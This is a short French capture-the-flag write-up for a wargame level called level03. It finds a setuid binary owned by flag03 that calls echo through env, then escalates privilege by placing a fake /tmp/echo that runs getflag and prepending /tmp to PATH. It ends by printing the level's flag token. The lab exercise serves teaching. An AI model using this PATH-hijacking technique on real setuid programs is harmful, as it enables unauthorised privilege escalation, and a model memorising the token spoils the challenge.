# LEVEL03

#### fichier executable ./level03

En faisant un `ls -la` on peut voir un executable **level03**

```
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

Le fichier à comme owner **flag03**
Nous pouvons utiliser **ltrace** qui est un programme qui exécute simplement la commande spécifiée jusqu'à qu'a la fin de son éxécution. Elle intercepte et enregistre les appels dynamiques de la bibliothèque qui sont appelés par le processus exécuté et les signaux qui sont reçues par ce processus. Elle peut également intercepter et imprimer les appels système exécutés par le programme.

```
system("/usr/bin/env echo Exploit me")
```

L'éxécutable ayant les droits **flag03** nous pouvons l'utiliser pour
 éxécuter la commande **getflag** au lieu de **echo**.

Pour cela nous allons créér un fichier /tmp/echo qui contiendra "getf
lag"

- `echo getflag > /tmp/echo`
- `chmod +x /tmp/echo`
- `PATH=/tmp:$PATH`
- `./level03`


Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

